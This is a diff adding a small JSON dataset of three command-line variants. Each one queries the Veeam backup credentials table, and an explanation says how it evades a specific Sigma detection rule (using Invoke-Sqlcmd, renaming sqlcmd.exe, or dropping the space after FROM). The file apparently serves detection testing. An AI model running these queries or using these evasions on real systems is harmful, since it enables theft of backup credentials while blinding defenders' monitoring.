@@ -1,0 +1,14 @@
+[
+  {
+    "output": "Invoke-Sqlcmd -Query \"SELECT * FROM VeeamBackup.dbo.Credentials\" -ServerInstance \"localhost\"",
+    "explanation": "The Sigma rule explicitly filters for the '\\sqlcmd.exe' binary. Executing the database query using PowerShell's native Invoke-Sqlcmd cmdlet bypasses the 'selection_sql' Image condition entirely."
+  },
+  {
+    "output": "copy \"C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\sqlcmd.exe\" C:\\Temp\\dbquery.exe && C:\\Temp\\dbquery.exe -S localhost -d VeeamBackup -Q \"SELECT * FROM Credentials\"",
+    "explanation": "By copying or renaming the sqlcmd.exe binary to a different name (e.g., dbquery.exe), the execution evades the 'Image|endswith: \\sqlcmd.exe' condition while executing the exact same tool."
+  },
+  {
+    "output": "sqlcmd.exe -S localhost -d VeeamBackup -Q \"SELECT * FROM[Credentials]\"",
+    "explanation": "The rule strictly looks for the literal string 'From ' containing a trailing space. Omitting the space by using SQL bracket identifiers (FROM[Credentials]), or substituting the space with a tab/newline character, breaks the exact string match requirement in 'selection_sql'."
+  }
+]
